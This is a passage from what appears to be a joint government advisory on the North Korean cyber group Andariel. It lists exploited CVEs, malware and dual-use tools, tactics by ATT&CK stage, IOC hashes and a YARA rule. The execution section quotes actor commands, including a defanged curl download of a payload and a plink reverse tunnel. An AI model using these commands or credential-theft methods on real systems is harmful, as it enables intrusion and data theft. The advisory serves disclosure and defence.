<li>Casting, fabrication, high-heat metal molding, and rubber and plastic molding</li>
<li>Machining processes and technology</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities as satisfying collection requirements for Pyongyang’s nuclear and defense programs.</p>
<h4><strong>Ransomware</strong></h4>
<p>Andariel actors fund their espionage activity through ransomware operations against U.S. healthcare entities, and in some instances, the authoring agencies have observed the actors launching ransomware attacks and conducting cyber espionage operations on the same day and/or leveraging ransomware and cyber espionage against the same entity. For more information on this ransomware activity, see joint advisories <a href=\"https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3293960/us-south-korean-agencies-partner-to-stopransomware-threat-from-dprk/\" title=\"#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities\">#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities</a> and <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-187a\" title=\" North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector\">North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector</a>.</p>
<h3>Malicious Cyber Espionage Activity</h3>
<p>This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 15. See the Appendix: MITRE ATT&amp;CK Techniques for all referenced tactics and techniques.</p>
<h4><strong>Reconnaissance and Enumeration</strong></h4>
<p>While there is limited available information on the group’s initial reconnaissance methods, the actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1592\" title=\"Gather Victim Host Information\">T1592</a>]. The actors gather open source information about their victims for use in targeting [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1591\" title=\"Gather Victim Org Information\">T1591</a>] and research Common Vulnerabilities and Exposures (CVEs) when published to the National Institute of Standards and Technology (NIST) National Vulnerability Database [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a>]. CVEs researched include:</p>
<ul>
<li>CVE-2023-46604 – Apache ActiveMQ</li>
<li>CVE-2023-42793 – TeamCity&nbsp;</li>
<li>CVE-2023-3519 – Citrix NetScaler</li>
<li>CVE-2023-35078 – Ivanti Endpoint Manager Mobile (EPMM)&nbsp;</li>
<li>CVE-2023-34362 – MOVEIt&nbsp;</li>
<li>CVE-2023-33246 – RocketMQ&nbsp;</li>
<li>CVE-2023-32784 – KeePass&nbsp;</li>
<li>CVE-2023-32315 – Openfire&nbsp;</li>
<li>CVE-2023-3079 – Google Chromium V8 Type Confusion</li>
<li>CVE-2023-28771 and CVE-2023-33010 – Zyxell firmware</li>
<li>CVE-2023-2868 – Barracuda Email Security Gateway</li>
<li>CVE-2023-27997 – FortiGate SSL VPN&nbsp;</li>
<li>CVE-2023-25690 – Apache HTTP Server</li>
<li>CVE-2023-21932 – Oracle Hospitality Opera 5</li>
<li>CVE-2023-0669 – GoAnywhere MFT</li>
<li>CVE-2022-47966 – ManageEngine&nbsp;</li>
<li>CVE-2022-41352 and CVE-2022-27925 – Zimbra Collaboration Suite</li>
<li>CVE-2022-30190 – Microsoft Windows Support Diagnostic Tool</li>
<li>CVE-2022-25064 – TP-LINK<s>&nbsp;</s></li>
<li>CVE-2022-24990 and CVE-2021-45837 – TerraMaster NAS</li>
<li>CVE-2022-24785 – Moment.js&nbsp;</li>
<li>CVE-2022-24665, CVE-2022-24664, and CVE-2022-24663 – PHP Everywhere&nbsp;</li>
<li>CVE-2022-22965 – Spring4Shell</li>
<li>CVE-2022-22947 – Spring Cloud Gateway&nbsp;</li>
<li>CVE-2022-22005 – Microsoft SharePoint Server&nbsp;</li>
<li>CVE-2022-21882 – Win32k Elevation of Privilege&nbsp;</li>
<li>CVE-2021-44228 – Apache Log4j&nbsp;</li>
<li>CVE-2021-44142 – Samba vfs_fruit module&nbsp;</li>
<li>CVE-2021-43226, CEV-2021-43207, CVE-2021-36955 – Windows log file vulnerabilities</li>
<li>CVE-2021-41773 – Apache HTTP Server 2.4.49</li>
<li>CVE-2021-40684 – Talend ESB Runtime&nbsp;</li>
<li>CVE-2021-3018 – IPeakCMS 3.5&nbsp;</li>
<li>CVE-2021-20038 – SMA100 Apache httpd server (SonicWall)&nbsp;</li>
<li>CVE-2021-20028 – SonicWall Secure Remote Access (SRA)&nbsp;</li>
<li>CVE-2019-15637 – Tableau&nbsp;</li>
<li>CVE-2019-7609 – Kibana</li>
<li>CVE-2019-0708 – Microsoft Remote Desktop Services&nbsp;</li>
<li>CVE-2017-4946 – VMware V4H and V4PA</li>
</ul>
<h4><strong>Resource Development, Tooling, and Remote Access Tools</strong></h4>
<p>The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.</p>
<ul>
<li>Atharvan</li>
<li>ELF Backdoor</li>
<li>Jupiter</li>
<li>MagicRAT</li>
<li>“No Pineapple”</li>
<li>TigerRAT</li>
<li>Valefor/VSingle</li>
<li>ValidAlpha</li>
<li>YamaBot</li>
<li>NukeSped</li>
<li>Goat RAT</li>
<li>Black RAT</li>
<li>AndarLoader</li>
<li>DurianBeacon</li>
<li>Trifaux</li>
<li>KaosRAT</li>
<li>Preft</li>
<li>Andariel Scheduled Task Malware</li>
<li>BottomLoader (see Cisco Talos blog Operation Blacksmith)</li>
<li>NineRAT (see Cisco Talos blog Operation Blacksmith)</li>
<li>DLang (see Cisco Talos blog Operation Blacksmith)</li>
<li>Nestdoor (see AhnLab blog)</li>
</ul>
<p>These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/001/\" title=\"Develop Capabilities: Malware\">T1587.001</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/004/\" title=\"Develop Capabilities: Exploits\">T1587.004</a>]. The tools allow the actors to maintain access to the victim system with each implant having a designated C2 node.</p>
<h4><strong>Commodity Malware and Dual-Use Applications</strong></h4>
<p>Commodity malware is malicious software widely available for purchase or use and is leveraged by numerous different threat actors. Dual-use applications are software tools widely available for purchase or use that are commonly utilized by administrators and users for system administration or other legitimate purposes and also by threat actors for malicious activities. These dual-use applications may reside locally, known as Living Off the Land (LOTL) tools, or be transferred to the target system during the attack. The use of publicly available malware and dual-use applications.&nbsp;The use of publicly available malware &nbsp;and dual-use applications enables the actors to conceal and obfuscate their identities and leads to attribution problems. The authoring agencies are reliant on the use of custom malware and loaders, along with overlapping C2 nodes to attribute commodity malware to the actors. The actors have at times achieved great success obfuscating their identities by&nbsp;leveraging open source malware. The authoring agencies have identified the following open-source and dual-use&nbsp;tools as used and/or customized by the actors:</p>
<ul>
<li>3Proxy [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>]</li>
<li>AdFind [<a href=\"https://attack.mitre.org/versions/v15/software/S0552/\" title=\"AdFind\">S0552</a>]</li>
<li>AsyncRAT</li>
<li>DeimosC2</li>
<li>Impacket [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>]</li>
<li>Juggernaut [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1040\" title=\"Network Sniffing\">T1040</a>]</li>
<li>Lilith RAT</li>
<li>ORVX Web Shell</li>
<li>Mimikatz [<a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a>]</li>
<li>PLINK [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]</li>
<li>ProcDump [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>]</li>
<li>PuTTY [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]</li>
<li>SOCKS5 [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>]</li>
<li>Stunnel [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]&nbsp;</li>
<li>Web Shell by Orb (WSO)</li>
<li>WinRAR [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a>]</li>
<li>WinSCP [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>]</li>
<li>RDP Wrapper [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]</li>
</ul>
<h4><strong>Initial Access</strong></h4>
<p>The actors gain initial access through widespread exploitation of web servers through known vulnerabilities, such as CVE-2021-44228 (“Log4Shell”) in Apache’s Log4j software library and other CVEs listed above, to deploy web shells and gain access to sensitive information and applications for further exploitation. The actors continue to breach organizations by exploiting web server vulnerabilities in public-facing devices and have conducted widespread activity against a number of different organizations simultaneously [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a>].</p>
<h4><strong>Execution</strong></h4>
<p>The actors are well-versed in using native tools and processes on systems, known as living off the land (LOTL). They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration. While individual commands typically vary, the authoring agencies assess the actors prefer <code>netstat</code> commands, such as <code>netstat –naop</code> and <code>netstat –noa</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/\" title=\"Command and Scripting Interpreter\">T1059</a>]. Example commands used by the actors include the following:</p>
<ul>
<li><code>netstat –naop&nbsp;</code></li>
<li><code>netstat –noa</code></li>
<li><code>pvhost.exe -N -R [IP Address]:[Port] -P [Port] -l [username] -pw [password] &lt;Remote_IP&gt;</code></li>
<li><code>curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe</code></li>
<li><code>C:\\windows\\system32\\cmd.exe /c systeminfo | findstr Logon</code></li>
</ul>
<p>These actors often make typos and other mistakes, indicating that the commands are not directly copied from a playbook and the actors have a flexible and impromptu approach. The typos also illustrate a poor grasp of the English language, including common errors such as “Microsoft Cooperation” (rather than “Microsoft Corporation”) found across numerous RGB 3rd Bureau malware samples.</p>
<h4><strong>Defense Evasion</strong></h4>
<p>The actors routinely pack late-stage tooling in VMProtect and Themida. Malicious tooling packed with these and other commercial tools have advanced anti-debugging and detection capabilities. These files are typically multiple megabytes in size and often contain unusual file section names such as <code>vmp0</code> and <code>vmp1</code> for VMProtect and Themida or randomized file section names for Themida [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a>].</p>
<h4><strong>Credential Access</strong></h4>
<p>The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump, and accessing the Active Directory domain database through targeting of the <code>NTDS.dit</code> file. The authoring agencies assess the actors change settings on compromised systems to force the system to store credentials and then use the aforementioned tools to steal credentials. In one instance, the actors used the <code>vssadmin</code> command-line utility to back up a volume to retrieve a copy of the <code>NTDS.dit</code> file containing Active Directory data. In another instance, the actors were observed collecting registry hive data for offline extraction of credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>].</p>
<h4><strong>Discovery</strong></h4>
<p>The actors used customized file system enumeration tooling written in .NET. The tool is capable of receiving and executing command line arguments to enumerate directories and files and compress output files. The tool collects the following information for each drive targeted on a system: depth relative to starting path, name, last write time, last access time, creation time, size, and attributes [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1087\" title=\"Account Discovery\">T1087</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1083\" title=\"File and Directory Discovery\">T1083</a>].&nbsp;</p>
<p>The actors also enumerate directories and files of connected devices using Server Message Block (SMB) protocol, which enables network file sharing and the ability to request services and programs from a network [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/002\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a>].</p>
<h4><strong>Lateral Movement</strong></h4>
<p>The actors also use system logging for discovery to move laterally. The group logs active window changes, clipboard data, and keystrokes and saves the collected logging information to the <code>%Temp%</code> directory.</p>
<p>The actors have also used Remote Desktop Protocol (RDP) to move laterally [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021\">T1021</a>].</p>
<h4><strong>Command and Control</strong></h4>
<p>The actors leverage techniques and infrastructure positioned around the world to send commands to compromised systems. The actors disguise their malware within HTTP packets to appear as benign network traffic. They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server. Tunneling enables the actors to perform C2 operations despite network configurations that would typically pose a challenge, such as the use of Network Address Translation (NAT) or traffic funneled through a web proxy [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/\" title=\"Application Layer Protocol\">T1071</a>].</p>
<h4><strong>Collection and Exfiltration</strong></h4>
<p>Malware previously used by the actors permitted placement and access to search through files that could be of interest, including scanning computer files for keywords related to defense and military sectors in English and Korean. The actors identify data for theft by enumerating files and folders across many directories and servers using command-line activity or functionality built into custom tools. The actors collect the relevant files into RAR archives, sometimes using a version of WinRAR brought into the victim’s environment with other malicious tooling [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1039\" title=\"Data from Network Shared Drive\">T1039</a>].</p>
<p>The actors typically exfiltrate data to web services such as cloud storage or servers not associated with their primary C2. Notably, the actors have been observed logging into actor-controlled cloud-based storage service accounts directly from victim networks to exfiltrate data [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1567\" title=\"Exfiltration Over Web Service\">T1567</a>]. The actors have also been observed using the utilities PuTTY and WinSCP to exfiltrate data to North Korea-controlled servers via File Transfer Protocol (FTP) and other protocols [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>].</p>
<p>The actors have also been identified staging files for exfiltration on victim machines, establishing Remote Desktop Protocol connections, and conducting <code>HTTP GET</code> requests on port <code>80</code> to receive information [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021\" title=\"Remote Services\">T1021</a>].</p>
<h2><strong>Indicators of Compromise</strong></h2>
<p>See below for Andariel IOCs.</p>
<p>The following include observed MD5 hashes:</p>
<ul>
<li>88a7c84ac7f7ed310b5ee791ec8bd6c5</li>
<li>6ab4eb4c23c9e419fbba85884ea141f4</li>
<li>97ce00c7ef1f7d98b48291d73d900181</li>
<li>079b4588eaa99a1e802adf5e0b26d8aa</li>
<li>0873b5744d8ab6e3fe7c9754cf7761a3</li>
<li>0d696d27bae69a62def82e308d28857a</li>
<li>0ecf4bac2b070cf40f0b17e18ce312e6</li>
<li>17c46ed7b80c2e4dbea6d0e88ea0827c</li>
<li>1f2410c3c25dadf9e0943cd634558800</li>
<li>2968c20a07cfc97a167aa3dd54124cda</li>
<li>33e85d0f3ef2020cdb0fc3c8d80e8e69</li>
<li>4118d9adce7350c3eedeb056a3335346</li>
<li>4aa57e1c66c2e01f2da3f106ed2303fa</li>
<li>58ad3103295afcc22bde8d81e77c282f</li>
<li>5c41cbf8a7620e10f158f6b70963d1cb</li>
<li>61a949553d35f31957db6442f36730c5</li>
<li>72a22afde3f820422cfdbba7a4cbabde</li>
<li>84bd45e223b018e67e4662c057f2c47e</li>
<li>86465d92f0d690b62866f52f5283b9fc</li>
<li>8b395cc6ecdec0900facf6e93ec48fbb</li>
<li>97f352e2808c78eef9b31c758ca13032</li>
<li>a50f3b7aa11b977ae89285b60968aa67</li>
<li>afd25ce56b9808c5ed7eade75d2e12a7</li>
<li>afdeb24975a318fc5f20d9e61422a308</li>
<li>b697b81b341692a0b137b2c748310ea7</li>
<li>bcac28919fa33704a01d7a9e5e3ddf3f</li>
<li>c027d641c4c1e9d9ad048cda2af85db6</li>
<li>c892c60817e6399f939987bd2bf5dee0</li>
<li>cdeae978f3293f4e783761bc61b34810</li>
<li>d0f310c99476f1712ac082f78dd29fdc</li>
<li>d8da33fae924b991b776797ba8cde24c</li>
<li>e230c5728f9ea5a94e390e7da7bf1ffa</li>
<li>f4d46629ca15313b94992f3798718df7</li>
<li>fb84a392601fc19aeb7f8ce11b3a4907</li>
<li>ff3194d3d5810a42858f3e22c91500b1</li>
<li>13b4ce1fc26d400d34ede460a8530d93</li>
<li>41895c5416fdc82f7e0babc6bb6c7216</li>
<li>c2f8c9bb7df688d0a7030a96314bb493</li>
<li>33a3da2de78418b89a603e28a1e8852c</li>
<li>4896da30a745079cd6265b6332886d45</li>
<li>73eb2f4f101aab6158c615094f7a632a</li>
<li>7f33d2d2a2ce9c195202acb59de31eee</li>
<li>e1afd01400ef405e46091e8ef10c721c</li>
<li>fe25c192875ec1914b8880ea3896cda2</li>
<li>232586f8cfe82b80fd0dfa6ed8795c56</li>
<li>c1f266f7ec886278f030e7d7cd4e9131</li>
<li>49bb2ad67a8c5dfbfe8db2169e6fa46e</li>
<li>beb199b15bd075996fa8d6a0ed554ca8</li>
<li>4053ca3e37ed1f8d37b29eed61c2e729</li>
<li>3a0c8ae783116c1840740417c4fbe678</li>
<li>0414a2ab718d44bf6f7103cff287b312</li>
<li>ca564428a29faf1a613f35d9fa36313f</li>
<li>ad6d4eb34d29e350f96dc8df6d8a092e</li>
<li>dc70dc9845aa747001ebf2a02467c203</li>
<li>3d2ec58f37c8176e0dbcc47ff93e5a76</li>
<li>0a09b7f2317b3d5f057180be6b6d0755</li>
<li>1ffccc23fef2964e9b1747098c19d956</li>
<li>9112efb49cae021abebd3e9a564e6ca4</li>
<li>ac0ada011f1544aa3a1cf27a26f2e288</li>
<li>0211a3160cc5871cbcd4e5514449162b</li>
<li>7416ea48102e2715c87edd49ddbd1526</li>
<li>a2aefb7ab6c644aa8eeb482e27b2dbc4</li>
<li>e7fd7f48fbf5635a04e302af50dfb651</li>
<li>33b2b5b7c830c34c688cf6ced287e5be</li>
<li>e5410abaaac69c88db84ab3d0e9485ac</li>
<li>eb35b75369805e7a6371577b1d2c4531</li>
<li>5a3f3f75048b9cec177838fb8b40b945</li>
<li>9d7bd0caed10cc002670faff7ca130f5</li>
<li>8434cdd34425916be234b19f933ad7ea</li>
<li>bbaee4fe73ccff1097d635422fdc0483</li>
<li>79e474e056b4798e0a3e7c60dd67fd28</li>
<li>95c276215dcc1bd7606c0cb2be06bf70</li>
<li>426bb55531e8e3055c942a1a035e46b9</li>
<li>cfae52529468034dbbb40c9a985fa504</li>
<li>deae4be61c90ad6d499f5bdac5dad242</li>
<li>bda0686d02a8b7685adf937cbcd35f46</li>
<li>6de6c27ca8f4e00f0b3e8ff5185a59d1</li>
<li>c61a8c4f6f6870c7ca0013e084b893d2</li>
<li>5291aed100cc48415636c4875592f70c</li>
<li>f4795f7aec4389c8323f7f40b50ae46f</li>
<li>cf1a90e458966bcba8286d46d6ab052c</li>
<li>792370eb01e16ac3dc511143932d0e1d</li>
<li>612538328e0c4f3e445fb58ef811336a</li>
<li>9767aa592ec2d6ae3c7d40b6049d0466</li>
<li>b22fd0604c4f189f2b7a59c8f48882dd</li>
<li>e53ca714787a86c13f07942a56d64efa</li>
<li>c7b09f1dd0a5694de677f3ecceda41b7</li>
<li>c8346b39418f92725719f364068a218d</li>
<li>730bff14e80ffd7737a97cdf11362ab5</li>
<li>9a481bc83fea1dea3e3bdfff5e154d44</li>
<li>ddb1f970371fa32faae61fc5b8423d4b</li>
<li>6c2b947921e7c77d9af62ce9a3ed7621</li>
<li>977d30b261f64cc582b48960909d0a89</li>
<li>7ce51b56a6b0f8f78056ddfc5b5de67c</li>
<li>dd9625be4a1201c6dfb205c12cf3a381</li>
<li>ecb4a09618e2aba77ea37bd011d7d7f7</li>
<li>0fd8c6f56c52c21c061a94e5765b27b4</li>
<li>c90d094a8fbeaa8a0083c7372bfc1897</li>
<li>0055a266aa536b2fdadb3336ef8d4fba</li>
<li>55bb271bbbf19108fec73d224c9b4218</li>
<li>0c046a2f5304ed8d768795a49b99d6e4</li>
<li>f34664e0d9a10974da117c1ca859dba8</li>
<li>a2c2099d503fcc29478205f5aef0283b</li>
<li>e439f850aa8ead560c99a8d93e472225</li>
<li>7c30ed6a612a1fd252565300c03c7523</li>
<li>81738405a7783c09906da5c7212e606b</li>
<li>c027d641c4c1e9d9ad048cda2af85db6</li>
<li>eb7ba9f7424dffdb7d695b00007a3c6d</li>
<li>3e9ee5982e3054dc76d3ba5cc88ae3de</li>
<li>073e3170a8e7537ff985ec8316319351</li>
<li>9b0e7c460a80f740d455a7521f0eada1</li>
<li>2d02f5499d35a8dffb4c8bc0b7fec5c2</li>
<li>0984954526232f7d05910aa5b07c5893</li>
<li>4156a7283284ece739e1bae05f99e17c</li>
<li>3026d419ee140f3c6acd5bff54132795</li>
<li>7aa132c0cc63a38fb4d1789553266fc7</li>
<li>1a0811472fad0ff507a92c957542fffd</li>
<li>f8aef59d0c5afe8df31e11a1984fbc0a</li>
<li>82491b42b9a2d34b13137e36784a67d7</li>
<li>0a199944f757d5615164e8808a3c712a</li>
<li>9c97ea18da290a6833a1d36e2d419efc</li>
<li>16f768eac33f79775a9672018e0d64f5</li>
</ul>
<div class=\"WordSection1\">
<p>The following include observed SHA-256 hashes:</p>
<ul>
<li>ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6</li>
<li>db6a9934570fa98a93a979e7e0e218e0c9710e5a787b18c6948f2eedd9338984</li>
<li>773760fd71d52457ba53a314f15dddb1a74e8b2f5a90e5e150dea48a21aa76df</li>
<li>05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d</li>
<li>e3027062e602c5d1812c039739e2f93fc78341a67b77692567a4690935123abe</li>
<li>1962ebb7bf8d2b306c6f3b55c3dcd69a755eeff1a17577b7606894b781841c3a</li>
<li>f226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb</li>
<li>6db57bbc2d07343dd6ceba0f53c73756af78f09fe1cb5ce8e8008e5e7242eae1</li>
<li>b7435d23769e79fcbe69b28df4aef062685d1a631892c2354f96d833eae467be</li>
<li>66415464a0795d0569efa5cb5664785f74ed0b92a593280d689f3a2ac68dca66</li>
<li>def2f01fbd4be85f48101e5ab7ddd82efb720e67daa6838f30fd8dcda1977563</li>
<li>323cbe7a3d050230cfaa822c2a22160b4f8c5fe65481dd329841ee2754b522d9</li>
<li>74529dd15d1953a47f0d7ecc2916b2b92865274a106e453a24943ca9ee434643</li>
<li>1e4de822695570421eb2f12fdfe1d32ab8639655e12180a7ab3cf429e7811b8f</li>
<li>8ce219552e235dcaf1c694be122d6339ed4ff8df70bf358cd165e6eb487ccfc5</li>
<li>c2904dc8bbb569536c742fca0c51a766e836d0da8fac1c1abd99744e9b50164f</li>
<li>dda53eee2c5cb0abdbf5242f5e82f4de83898b6a9dd8aa935c2be29bafc9a469</li>
<li>90fb0cd574155fd8667d20f97ac464eca67bdb6a8ee64184159362d45d79b6a4</li>
<li>452ca47230afd4bb85c45af54fcacbfa544208ef8b4604c3c5caefe3a64dcc19</li>
<li>199ba618efc6af9280c5abd86c09cdf2d475c09c8c7ffc393a35c3d70277aed1</li>
<li>2eb16dbc1097a590f07787ab285a013f5fe235287cb4fb948d4f9cce9efa5dbc</li>
<li>ce779e30502ecee991260fd342cc0d7d5f73d1a070395b4120b8d300ad11d694</li>
<li>db6a9934570fa98a93a979e7e0e218e0c9710e5a787b18c6948f2eedd9338984</li>
<li>c28bb61de4a6ad1c5e225ad9ec2eaf4a6c8ccfff40cf45a640499c0adb0d8740</li>
<li>34d5a5d8bec893519f204b573c33d54537b093c52df01b3d8c518af08ee94947</li>
<li>664f8d19af3400a325998b332343a9304f03bab9738ddab1530869eff13dae54</li>
<li>772b06f34facf6a2ce351b8679ff957cf601ef3ad29645935cb050b4184c8d51</li>
<li>aa29bf4292b68d197f4d8ca026b97ec7785796edcb644db625a8f8b66733ab54</li>
<li>9a5504dcfb7e664259bfa58c46cfd33e554225daf1cedea2ec2a9d83bbbfe238</li>
<li>c2500a6e12f22b16e221ba01952b69c92278cd05632283d8b84c55c916efe27c</li>
<li>8aa6612c95c7cef49709596da43a0f8354f14d8c08128c4cb9b1f37e548f083b</li>
<li>38f0f2d658e09c57fc78698482f2f638843eb53412d860fb3a99bb6f51025b07</li>
</ul>
</div>
<p>The following include a list of user agent strings used by the actors:</p>
<ul>
<li>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</li>
<li>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0</li>
<li>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</li>
<li>Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</li>
<li>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0</li>
<li>Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</li>
<li>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</li>
<li>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0</li>
<li>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)</li>
<li>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</li>
<li>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</li>
<li>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0</li>
</ul>
<h2><strong>Detection Methods</strong></h2>
<p>See Table 2 for YARA rules, created by the FBI, authoring partners, and private industry, that can be used to detect malware used by the actors.</p>
<table>
<caption><em>Table 2. YARA Rules</em></caption>
<tbody>
<tr>
<td>rule Andariel_ScheduledTask_Loader<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $obfuscation1 = { B8 02 00 00 00 48 6B C0 00 B9 CD FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 01 B9 CC FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 02 B9 8D FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 03 B9 9A FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 04 B9 8C FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 05 B9 8A FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 06 33 C9 66 89 8C 04 60 01 00 00 }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $obfuscation2 = { 48 6B C0 02 C6 44 04 20 BA B8 01 00 00 00 48 6B C0 03 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 04 C6 44 04 20 8B B8 01 00 00 00 48 6B C0 05 C6 44 04 20 8A B8 01 00 00 00 48 6B C0 06 C6 44 04 20 9C B8 01 00 00 00 }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $obfuscation3 = { 48 6B C0 00 C6 44 04 20 A8 B8 01 00 00 00 48 6B C0 01 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 02 C6 44 04 20 93 B8 01 00 00 00 48 6B C0 03 C6 44 04 20 96 B8 01 00 00 00 48 6B C0 04 C6 44 04 20 B9 B8 01 00 00 00 48 6B C0 05 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 06 C6 44 04 20 8B B8 01 00 00 00 48 6B C0 07 C6 44 04 20 9E B8 01 00 00 00 48 6B C0 08 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 09 C6 44 04 20 8D B8 01 00 00 00 48 6B C0 0A C6 44 04 20 BC B8 01 00 00 00 }<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5A4D and $obfuscation1 and $obfuscation2 and $obfuscation3<br>}</td>
</tr>
<tr>
